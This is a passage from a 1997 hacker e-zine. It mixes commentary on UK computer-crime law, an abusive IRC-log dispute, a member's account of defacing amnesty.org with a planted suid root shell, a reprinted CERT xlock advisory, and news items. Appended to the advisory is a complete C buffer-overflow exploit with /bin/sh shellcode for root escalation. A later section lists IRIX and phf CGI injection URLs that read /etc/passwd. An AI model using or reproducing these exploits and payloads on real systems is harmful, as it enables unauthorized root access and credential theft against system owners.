{ This basically means, if you have the intent and knowledge of breaking
  into computers, without have to actually do it you can be liable to an
  offence. }

For the purposes of the Criminal Damage Act 1971 a modification of the
contents of a computer shall not be regarded as damaging any computer or
computer storage medium unless its effect on that computer storage medium,
impairs its physical condition.

{ Meaning that you cannot be prosecuted for criminal damage whilst hacking
  into a machine unless you cause physical damage i.e. on site hacking,
  then taking a sledge hammer to the computer can be classed as criminal
  damage but change the password for root login is not criminal damage,
  unless you send the computer into high speed self destruct mode and
  ruin one of the heads on the 50 gig duke box ? }

{ A lot of the next part of the document is about jurisdiction and some
  technical mumbo jumbo }


SECTION 14 Search warrants for offences under section 1
-------------------------------------------------------

Where a circuit judge is satisfied by information on oath given by a
constable that there are reasonable grounds for believing that an offence
under section 1 above has been or is about to be committed in any
premises; and that evidence that such an offence has been or is about to
be committed is in those premises he/she may issue a warrant authorising a
constable to enter and search the premises, using such reasonable force
as is necessary.

{ This basically means that if they believe that you have the intent or
  have broken into a system your not supposed to ( section 1 ) they can
  come around your house and knock your door in, or, open it for them
  nicely. }


SECTION 15 Extradition where Schedule 1 to the Extradition Act 1989 applies
---------------------------------------------------------------------------

The offences to which an order in council under section 2 of the extradition
act 1870 can apply shall include offences under sections 2 and 3 and any
conspiracy to commit such an offence and any attempt to commit an offence
under section 3.

{ This meaning, that if you have a conspiracy to break into a system you
  can be extradited }

In the UK it can be illegal to posses anything which may show an intent to
hack, such as hacking documents.

So, if your out there and in UK and didn't know that you were doing is most
probably illegal then keep your head down !

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  6. so1o Gets Busted By CERT : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

I've been busted by CERT?!@# umm, okay...whatever you say Hostile you fucken
pussy! and a cl000less one at that!@# Speadin' shit about stuff you dont know :

[20:57] <FuckingHostile> dude!!
<byteboy> wassup?
[20:59] <FuckingHostile> so1o got busted by CERT!
<byteboy> lol
[21:00] <FuckingHostile> yup
[21:00] <FuckingHostile> they have logs of him on over 80 computers
[21:01] <FuckingHostile> thats all i know is like what i just got
forwarded to me
[21:03] <FuckingHostile> they got logs from when he used phfscan.c
[21:03] <FuckingHostile> and other shit
any more info on so1o shit ?
[21:06] <FuckingHostile> l
[21:06] <FuckingHostile> Dear Sir.
[21:06] <FuckingHostile> We have now traced down the responsible account
behind this attempt and=20
[21:06] <FuckingHostile> have taken action against it.
[21:06] <FuckingHostile> If you would like to know who is behond this you
should either file a=20
[21:06] <FuckingHostile> report to the propper authoroties or fax pege
Gustagsson at  +++ 46 8=20
[21:06] <FuckingHostile> 7132657 and ask him to trace this down in the
phone network.
[21:06] <FuckingHostile> If you got any more question feel free to get
back to me.. or if you=20
[21:06] <FuckingHostile> think that this is to be considered as closed.
[21:06] <FuckingHostile> check this now
[21:06] <FuckingHostile>      __ ____ Telia Internet=20
[21:06] <FuckingHostile>   / /_/  /   Incident Response Team
[21:06] <FuckingHostile>  / / \  /    IRT@TELIA.NET
[21:06] <FuckingHostile> =09     FAX ++46 - 8 456 8935=20
[21:06] <FuckingHostile> On Fri, 2 May 1997, m0dify wrote:
[21:06] <FuckingHostile> > That is the log from our www.usda.gov web
server.... CERT also said that
[21:06] <FuckingHostile> > this log is on 80 computers since 4/1/97   .
There was also a log on
[21:06] <FuckingHostile> > the 17th of April. =20
[21:07] <FuckingHostile> > > Dear Sir.
[21:08] <FuckingHostile> > > This messages dropped down on my desk today.
[21:08] <FuckingHostile> > > I need a time to know who was on that dial up
and so whe could hunt
[21:08] <FuckingHostile> > > him/her down in the phone network..
[21:08] <FuckingHostile> heh... so1o fuct up it seems..
<byteboy> he's toast.
[21:10] <FuckingHostile> im glad to man... amnesty was just so uncool when
he did that

h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0!@#
h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0!@#
h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0!@#
h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0!@#
h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0!@#
h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0!@#
h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0!@#
h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0!@#
h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0!@#
h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0h0!@#

I've seen one of those logs that Modify had (now CERT have them too) and,
I'm sooooo dissapointed to say...

            -I- -D-I-D-N-'-T -P-H-F- -T-H-O-S-E- S-I-T-E-S-

Let us look at the facts...Those that Hostile and his little lameassfuck sIn
wannabe haqr posse didn't even see :

-------------------------------------------------------------------------------
 THE FACTS :
-------------------------------------------------------------------------------

  CERT logs show that the phf queries to approximatley 80
  sites on the same day that the www.amnesty.org page was
  changed show that this technique was used..which is
  fundementally incorrect, here is the phf query string
  found in the logs, the fact that this was on the same
  day as amnesty is the ONLY factor linking me to these
  events :

    GET /cgi-bin/phf?qalias=X%0Acat%20/etc/passwd

  (I think there's also a "3D" somewhere in there too..)

  And here is the phf query code set down by every text
  I have ever read AND in phfscan.c which I would use if
  I ever wanted to scan such sites for the phf hole :

    GET /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd

  I think we can all see a slight difference, which basically
  says "IT'S NOT MY FUCKING STYLE! ONLY A LUNA-FUCKING-TICK
  would even think about using that technique. Seeing it
  probably wouldn't work anyway."

  The next point is the IP from where the queries originate,
  it is *.telia.com which I have been told is a SWEDISH ISP
  now, do I live in Sweden? NO!! Do I have any shells at
  dynamic IP's IN SWEDEN? NO!! There is no plausible way
  I could have run such a scan. Unless I dial long distance,
  which isn't gonna happen.

  One last point, I knew that we "0wned" amnesty.org from
  about 2 weeks before we actually decided to change the
  index.html, because when my friends broke in the first
  time, they had set up a .rhosts file and a suid root shell
  in something like /tmp/.... But when they left the system
  and tried to regain access, they found that the admin had
  removed the account or changed the login and pass, so we
  decided to leave the site for about a week and a half, until
  we started to try and formulate a way to get back in, in
  this period we did NO phf scanning whatsoever. And on the
  weekend when we did get back in, using an ingenious method
  that I was never told about, by a new hacker to our team,
  modeX, we decided to at least do something to prove we had
  regained access, so I designed a new index.html, to which
  the team uploaded. That was all that happened, and therefore
  the phf scans can IN NO WAY be related to the amnesty.org
  attack as we owned that system A LONG TIME before, and it
  was only a matter of regaining access, one last point being
  that we didn't walk through the amnesty "front door" as it
  were, as I was told we stumbled over a trusted host,
  shell.oil.ca or something like that.

  Anyway, thats just a few points I would like to raise in
  proving that sIn are again VERY CL000LESS fucks who know
  absolutely NOTHING about hacking or "the scene" in any way
  shape or form...And as for the Incident Response Team, they
  are most probably looking for some lamefuck Swedish haqr.

  Any-Fucking-Way, what the fuck they gonna do when they find
  this haqr?!@ arrest him for phf'ing 80 sites? h0h0h0, I wouldn't
  call that much of a bust :) "Listen sonny! you're gonna get 10
  years for connecting to port 80 and typing "GET /cgi-bin/phf?
  Qalias=x%0a/bin/cat%20/etc/passwd" becuase thats not against
  ANY law and CERT owns us all.

    so1o.
   
  There are alot of missing pieces, and alot of the data I base
  my argument on originated from m0dify (see the letter to
  IRT@TELIA.NET earlier) so I think I have more of an idea than
  Hostile the cl00less lame gimpfuck wannabe haqr.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  7. CERT Advisory CA-97.13 : xlock vunerablity : Taken From Bugtraq
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  Topic: Vulnerability in xlock
-------------------------------------------------------------------------------

The CERT Coordination Center has received reports that a buffer overflow
condition exists in some implementations of xlock. This vulnerability makes it
possible for local users (users with access to an account on the system) to
execute arbitrary programs as a privileged user.

Exploitation information involving this vulnerability has been made publicly
available.

If your system is vulnerable, the CERT/CC team recommends installing a
patch from your vendor. If you are not certain whether your system is
vulnerable or if you know that your system is vulnerable and you cannot add a
patch immediately, we urge you to apply the workaround described in
Section III.B.

We will update this advisory as we receive additional information.
Please check our advisory files regularly for updates that relate to your site.

-------------------------------------------------------------------------------

I.   Description

     xlock is a program that allows a user to "lock" an X terminal. A buffer
     overflow condition exists in some implementations of xlock. It is
     possible attain unauthorized access to a system by engineering a
     particular environment and calling a vulnerable version of xlock that has
     setuid or setgid bits set. Information about vulnerable versions must be
     obtained from vendors. Some vendor information can be found in Appendix A
     of this advisory.

     Exploitation information involving this vulnerability has been made
     publicly available.

     Note that this problem is different from that discussed in CERT Advisory
     CA-97.11.libXt.


II.  Impact

     Local users are able to execute arbitrary programs as a privileged user
     without authorization.


III. Solution

     Install a patch from your vendor as described in Solution A. If you are
     not certain whether your system is vulnerable or if you know that your
     system is vulnerable and you cannot install a patch immediately, we
     recommend Solution B.

     A.  Obtain and install a patch for this problem.

         Below is a list of vendors who have provided information about
         xlock. Details are in Appendix A of this advisory; we will
         update the appendix as we receive more information. If your
         vendor's name is not on this list, the CERT/CC did not hear from
         that vendor. Please contact your vendor directly.

         Berkeley Software Design, Inc. (BSDI)
         Cray Research - A Silicon Graphics Company
         Data General Corporation
         Digital Equipment Corporation
         FreeBSD, Inc.
         Hewlett-Packard Company
         IBM Corporation
         LINUX
         NEC Corporation
         The Open Group [This group distributes the publicly available software
                         that was formerly distributed by X Consortium]
         Solbourne
         Sun Microsystems, Inc.


     B.  We recommend the following workaround if you are not certain
         whether your system is vulnerable or if you know that your system
         is vulnerable and you cannot install a patch immediately.

         1. Find and disable any copies of xlock that exist on your system and
            that have the setuid or setgid bits set.

         2. Install a version of xlock known to be immune to this
            vulnerablility. One such supported tool is xlockmore. The latest
            version of this tool is 4.02, and you should ensure that this is
            the version you are using. This utility can be obtained from the
            following site:

               ftp://ftp.x.org/contrib/applications/xlockmore-4.02.tar.gz
               MD5 (xlockmore-4.02.tar.gz) = c158e6b4b99b3cff4b52b39219dbfe0e

            You can also obtain this version from mirror sites. A list of
            these sites will be displayed if you are not able to access the
            above archive due to load.

...........................................................................

Appendix A - Vendor Information

Below is a list of the vendors who have provided information for this
advisory. We will update this appendix as we receive additional information.
If you do not see your vendor's name, the CERT/CC did not hear from that
vendor. Please contact the vendor directly.

Berkeley Software Design, Inc. (BSDI)
=====================================
BSD/OS is not vulnerable to the problem in xlock since our
xlock is not setuid.


Cray Research - A Silicon Graphics Company
==========================================
Cray Research does not include xlock in its X Window releases, so we are
not at risk on the xlock buffer overflow problem.


Data General Corporation
========================
The xlock sources (xlockmore-3.7) that DG includes in its contributed
software package have been modified to remove this vulnerability. These
will be available when release 8 comes out. We also recommend that our
customers who have the current version should change the sprintf calls in
resource.c to snprintf calls, rebuild and reinstall the package.


Digital Equipment Corporation
=============================
This reported problem is not present for Digital's ULTRIX or
Digital UNIX Operating Systems Software.


FreeBSD, Inc.
=============
The xlockmore version we ship in our ports collection is vulnerable
in all shipped releases. The port in FreeBSD-current is fixed.
Solution is to install the latest xlockmore version (4.02).


Hewlett-Packard Company
=======================
We ship an suid root program vuelock that is based on xlock.
It does have the vulnerability.

The only workaround is to remove the executable, the patch is "in process".


IBM Corporation
===============
AIX is vulnerable to the conditions described in this advisory.
The following APARs will be released soon:

     AIX 3.2:  APAR IX68189
     AIX 4.1:  APAR IX68190
     AIX 4.2:  APAR IX68191

IBM and AIX are registered trademarks of International Business Machines
Corporation.


LINUX
=====
Red Hat:
        Not vulnerable

Caldera:
        Not vulnerable

Debian:
        An updated package is on the Debian site

SuSE:
        ftp://ftp.suse.com/pub/SuSE-Linux/suse_update/S.u.S.E.-4.4.1/xap1/xlock

And in general the new Xlockmore release fixes the problems.


NEC Corporation
===============
UX/4800              Not vulnerable for all versions.
EWS-UX/V(Rel4.2MP)   Not vulnerable for all versions.
EWS-UX/V(Rel4.2)     Not vulnerable for all versions.
UP-UX/V(Rel4.2MP)    Not vulnerable for all versions.


The Open Group
==============
Publicly available software that was formerly distributed by the X Consortium -

Not vulnerable.


Solbourne
=========
Solbourne is not vulnerable to this attack.


Sun Microsystems, Inc.
======================
We are producing patches for OpenWindows 3.0 for Sun OS versions
4.1.3_U1, 4.1.4, 5.3, 5.4, 5.5, and 5.5.1.



-------------------------------------------------------------------------------
The CERT Coordination Center thanks David Hedley for reporting the original
problem and Kaleb Keithley at The Open Group for his support in the
development of this advisory.
-------------------------------------------------------------------------------

If you believe that your system has been compromised, contact the CERT
Coordination Center or your representative in the Forum of Incident Response
and Security Teams (see http://www.first.org/team-info/).


CERT/CC Contact Information
------------------------------

Email    cert@cert.org

Phone    +1 412-268-7090 (24-hour hotline)
                CERT personnel answer 8:30-5:00 p.m. EST(GMT-5) / EDT(GMT-4)
                and are on call for emergencies during other hours.

Fax      +1 412-268-6989

Postal address

         CERT Coordination Center
         Software Engineering Institute
         Carnegie Mellon University
         Pittsburgh PA 15213-3890
         USA

Using encryption

   We strongly urge you to encrypt sensitive information sent by email. We can
   support a shared DES key or PGP. Contact the CERT/CC for more information.
   Location of CERT PGP key

         ftp://info.cert.org/pub/CERT_PGP.key

Getting security information

   CERT publications and other security information are available from

        http://www.cert.org/
        ftp://info.cert.org/pub/

   CERT advisories and bulletins are also posted on the USENET newsgroup

        comp.security.announce

   To be added to our mailing list for advisories and bulletins, send
   email to

        cert-advisory-request@cert.org

   In the subject line, type

        SUBSCRIBE  your-email-address

-------------------------------------------------------------------------------
* Registered U.S. Patent and Trademark Office.

Copyright 1997 Carnegie Mellon University
This material may be reproduced and distributed without permission provided
it is used for noncommercial purposes and the copyright statement is
included.

The CERT Coordination Center is part of the Software Engineering Institute
(SEI). The SEI is sponsored by the U.S. Department of Defense.
-------------------------------------------------------------------------------

This file: ftp://info.cert.org/pub/cert_advisories/CA-97.13.xlock
           http://www.cert.org

               click on "CERT Advisories"

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Revision history

-----BEGIN PGP SIGNATURE-----
Version: 2.6.2

iQCVAwUBM3DOFnVP+x0t4w7BAQH9MwQAwULlCDTqDbW+CiS0/Z36BtGf6Eqzx43B
pEt72rQlQbw2AqRnHeq85dzVUB4eKmL0T//bGYyo0sCt+8nlFaS3cNYh0cyl3jdu
JPDVoNhWB7v2+8nHvAEDz2UdomNVaxXDFvAbZ9JvEk/Ex6aFiXtl4qXdjxtcC4ze
kGKLcu0+LzE=
=nF5B
-----END PGP SIGNATURE-----

------------------------------------------------------------------------------
  The Exploit Code - not in the *ORIGINAL* CERT advisory ;] :
------------------------------------------------------------------------------

/*   x86 XLOCK overflow exploit
     by cesaro@0wned.org 4/17/97

     Original exploit framework - lpr exploit

     Usage: make xlock-exploit
            xlock-exploit  <optional_offset>

     Assumptions: xlock is suid root, and installed in /usr/X11/bin
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define DEFAULT_OFFSET          50
#define BUFFER_SIZE             996

long get_esp(void)
{
   __asm__("movl %esp,%eax\n");
}

int main(int argc, char *argv[])
{
   char *buff = NULL;
   unsigned long *addr_ptr = NULL;
   char *ptr = NULL;
   int dfltOFFSET = DEFAULT_OFFSET;

   u_char execshell[] = "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
                        "\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
                        "\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
                        "\xd7\xff\xff\xff/bin/sh";
   int i;

   if (argc > 1)
      dfltOFFSET = atoi(argv[1]);
   else printf("You can specify another offset as a parameter if you need...\n");

   buff = malloc(4096);
   if(!buff)
   {
      printf("can't allocate memory\n");
      exit(0);
   }
   ptr = buff;
   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
   ptr += BUFFER_SIZE-strlen(execshell);
   for(i=0;i < strlen(execshell);i++)
      *(ptr++) = execshell[i];
   addr_ptr = (long *)ptr;
   for(i=0;i<2;i++)
      *(addr_ptr++) = get_esp() + dfltOFFSET;
   ptr = (char *)addr_ptr;
   *ptr = 0;
   execl("/usr/X11/bin/xlock", "xlock", "-nolock", "-name", buff, NULL);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  8. IRiX WWW Server Bugs : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Number 1 :
----------

http://www.site.com/cgi-bin/wrap?/etc

...Lets you view the contents of the /etc/ directory, you can try others too..

Number 2 :
----------

http://www.site.com/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd

...Lets you view the /etc/passwd file, also try /etc/hosts to make sure the
cgi script isn't a trap. You can also execute some kind of remote shell using
webdist technique, but we are looking into it now...


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  9. Hacking Not-So-Electrical Items : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

y0h CrEw!@# T0daY wE WiLL LeArN tEw Hax0r....

                     TrEES!!! tReEs!!! TrEEs!!!
                     TrEES!!! tReEs!!! TrEEs!!!
                     TrEES!!! tReEs!!! TrEEs!!!

YePpO! TrEEs! LiKe Da oNeZ j00 FiNd In YeR GaRdEn SoMeTiMeS!!

oKaY, HeRe aRe THe k-LEeTo JuaReZ YeW wILL nEEd...

 1 : A HaCk SaW
 2 : CoMoFlAgUeD CLoThiNG
 3 : a CoPPeR NaiL
 4 : A hAmmER
 5 : a GI-JoE AcTiOn FiGuRe (WiTH pArAChUte)
 6 : a SmALL, wELL TrAiNeD InSecT, LiKe A bEE
 7 : oNe LaPtOp ComPUtEr (wIv d0S 2.4 *OnLy*)
 8 : OnE RS232 CaBlE

OkAy CrEw! ThIs iS Da mAsTA PlAn!@#

FiRsTly, aS WiTH mANy OtHer HaCks YoU WiLL nEEd tO ScAn Da PoRts Of ThE TrEE,
dO ThIs By UsIng tHE SmALL, wELL TrAiNeD InSecT, LiKe A bEE, aS bEE's aRe ThE
BeSt At SCannInG HiDDen PoRtz, WhEn ThE bEE HaS fOuND sOmE kEwL PoRtS (UsuALLy
aT dA tOp oF Da TrEE) tIe ThE GI-JoE AcTiOn FiGuRe tO ThE bEE, aNd gEt HiM To
PuT YeR Rs232 CaBle Up ThErE sO YeW CaN AcCesS dA PoRt Of Da TrEE!

WhEn ThE rS232 cAbLE iS In pLACe, PuT oN ThE CaMofLAUgEd CloTHIng, AnD HiDe
BeHiNd A bUsH WiTh YoUr LaPtOP, ThEn GeT ThE GI-JoE AcTiOn FiGuRe To PaRAcHute
d0Wn dA TrEE, aNd GiVe YoU ThE OTheR EnD Of dA Rs232 CaBLe, ThEn gO InTo DoS
AnD RuN tHiS PrOgRam In Gw-BASiC...

10 OPEN (COM PORT AND STUFF)
20 DATA "GIVE ME ALL YOUR K-LEET JUAREZ AND STUFF NOW, BECAUSE I OWN J00"
30 OPEN (ANOTHER PORT AND STUFF)
40 DATA "EYE BE W00PIN J00 F00L, PHEAR MUH ELEETNESS"
50 GOTO 10

ThIs ShOuLd cRaSh ThE TrEE, LeAvInG iT OpEn tO AtTaCk, NeXt TaKE ThE HaCk SaW
AnD StArT cUtTiNg The BaRK oFF ThE TrEE (OnLy iN oNe pLaCe) ThE BArk AcTs LiKe
a FiRewALL, AnD sO It MuSt Be tAkeN DoWN FirSt.

NeXt CHecK On YoUr LaPtOp WheThEr ThE TrEE HaS GiVen yEw eLeeT JuArEz, iF NoT
ThEN uSe The CoPPeR nAiL to rm -rf / ThE TrEE, HaMmEr The CoPPeR nAiL InTo The
TrEE, AnD ThE TrEE WiLL bE rm'd WitHiN aBOUt A wEEk (dEw TeW 99999999999999 GB
HaRd dRivE SPaCe)

hAvE PhUn! MoRe NoT-So-LeCtiCaL iTeMz NeXt TimE!@~^&*

TeEkAy.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ NEWS ]=====================[ .SECTION E. ]=======================[ NEWS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Amnesty International Hacked : Article From cnet.com
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

http://www.news.com/News/Item/0,4,10135,00.html

Amnesty International hacked 

                By Janet Kornblum
                April 28, 1997, 3:15 p.m. PT 

                Hackers broke into the Amnesty International home
                page over the weekend, altering it with a highly
                stylized, futuristic-looking graphic of a small child or
                baby smoking a cigarette. 

                Amnesty International didn't know what the
                perpetrators wanted to accomplish with the
                hacking, which was strikingly apolitical considering
                the political nature of the target. Above the picture,
                the altered Web page read, "Who laughs last? We
                are the 4 man dream team, just proving one of
                many points." 

                But just what those points were was lost on many,
                not the least of whom was Mike Blackstock, the
                system administrator for Ontario Internet Link, the
                small Canadian Internet service provider that hosts
                the Amnesty site for free. 

                "As far as I can tell, they didn't do anything
                malicious," he said. "They replaced one page of
                Amnesty with a silly graphic of a kid smoking. This
                was not political as far as I could tell. The only
                politics I could think of was cigarettes." 

                Beneath the picture, the page is signed, "Thanx to:
                so1o, modeX, XFli, mstrhelix...CodeZero uber
                alles!" 

                This hack appears to be unrelated to other recent
                high-profile incidents, including one last week in
                which a Portuguese group broke in to Indonesian
                government Web pages to protest its treatment of
                East Timor. In that case, the hackers--referred to
                by many as "crackers" because they crack into
                systems--were quite clear about the reasons behind
                their action. 

                In the case of the Amnesty page, Blackstone said
                the hackers only altered the Web page and did not
                cause major damage, though they could have done
                so if they wanted to. The altered page was up for a
                few hours, he said. 

                Blackstone was busy plugging the security hole but
                pointed out that sites much bigger with higher
                profiles, such as the Air Force, the Central
                Intelligence Agency, and the Justice Department,
                also have been hacked. 

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. //sToRm// Of sIn Rips Port Pro : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  Ummmm, on www.sinnerz.com //sToRm// has a lamefuck page with his k-leet
  w1nd0ze '95 juarez, coded in Visual Basic, with his "VB For Dummies" book,
  which include...

DrSpewfy         :  Pile'O'Crap, why not get a nameserver and sirc? and
                    actually be able to talk to people?

DCCNewk          :  Chargen Flood? why not try like, SYN FLOOD? d0h..

Port Pro         :  Okay, original Port Pro is SHAREWARE, made by Blue Byte
                    Software, and it is SOOO obvious that //sToRm// just did a
                    little bit of hex editing, and B00oo00m! hes changed the
                    authors name and shit to his own! but ummm, because of his
                    EXTREME lameness, he didn't know how to change the program
                    name, the version and the general interface and look of the
                    program, what a LAME FUCK. I'm sure he will have Blue Byte
                    on his fucking ass with Copyright and shit. h0h0h0h0h0!@#
                    I doubt //sToRm// coded *ANYTHING* on that page,
                    as DrSpewfy is just shit, and DCCNewk is just like the DCC
                    Nuking code we put out in the CodeZero Technical Journal
                    Issue 2 :)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Digital Darkness Lives : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

It looked as if the DD wouldn't bring out a magazine this month, but they
got a huge influx of submissions and live another day!@# if you want to submit
anything for DD, mail spamman@erols.com or spaman@erols.com 'cos I ain't shure.

Visit their page too : http://dd.home.ml.org

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. /home/sdr 0wned : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

sdr, a user of duncan.nac.net (owned by bspline - where all the cool people on
efnet have their shells) was playing with the permissions in his home directory
and he accidentally made the whole directory world readable, so then cold blood
and others got all of sdr's k-leet y00nix juarez, and tar'd + gz'd them up and
were distributing the sdr.tar.gz in #hack using XDCC :)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. Sendmail 8.8.4 Remote Is Out : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Yep, its been confirmed, the sendmail 884 remote exploit for ALL OS's is now
out, there was some delay in r00t members getting the offsets needed for each
Operating System, but now the technique is complete, and many 8.8.4 systems
are vunerable. Sendmail 8.8.5 remote exploits are being looked into now.

